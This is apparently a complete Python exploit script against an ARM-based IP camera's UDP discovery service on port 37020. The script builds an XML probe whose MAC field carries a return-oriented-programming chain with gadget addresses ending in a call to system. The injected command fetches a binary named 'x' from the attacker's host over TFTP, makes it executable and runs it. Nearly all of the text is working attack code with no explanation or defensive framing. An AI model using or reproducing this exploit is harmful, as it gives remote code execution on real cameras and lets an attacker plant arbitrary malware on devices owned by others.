from socket import socket, AF_INET, SOCK_DGRAM, SOL_SOCKET, SO_REUSEADDR, SO_BROADCAST
from pwn import *
import hexdump

context.update(arch='arm', os='linux', endianness='little')

############################# Update! ################################
target_ip='10.42.0.106'                                              # IP address of your cam
host_ip=b'10.42.0.1'                                                 # Attacker IP
command = b'tftp -r x -g ' + host_ip + b' 9069;chmod +x x;./x'       # Command to be executed
######################################################################

time_out = 1
udp_bcast = '239.255.255.250'
udp_port = 37020

def send(custom_xml):
    global time_out,udp_port,udp_bcast
    s = socket.socket(AF_INET, SOCK_DGRAM)
    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
    s.settimeout(time_out)
    s.bind((host_ip ,0))
    r = s.sendto(custom_xml, (udp_bcast,udp_port ))
    s.close()
    return

payload = command + b'\n#<?xml version="1.0" encoding="utf-8"?><Probe><Uuid>'+b'a' * 6+b'</Uuid><Types>reset</Types><MAC>-------00-00-00-'
payload += b'f8-3a-25--'        # 0x00253af8 : pop {r0, pc}
payload += b'4c-9d-33--'        # sadp_buf_ptr - 0x10
payload += b'b0-25-17--'        # 0x001725b0 : ldr r0, [r0, #0x10] ; pop {r4, pc}
payload += b'----'
payload += b'c8-e7---'           # 0xe7c8 : system
payload += b'------</MAC></Probe>'

print("\nSending ropchain...")
print(payload + b"\n")
send(payload)


#-------00-00-00-f8-3a-25--4c-9d-33--b0-25-17------c8-e7----------------00-00-00-f8-3a-25--4c-9d-33--b0-25-17------c8-e7---------
#-----------------00-00-00-00-11-11-11-11-22-22-22-22-33-33-33-33-----------------00-00-00-00-11-11-11-11-22-22-22-22-33-33-33-33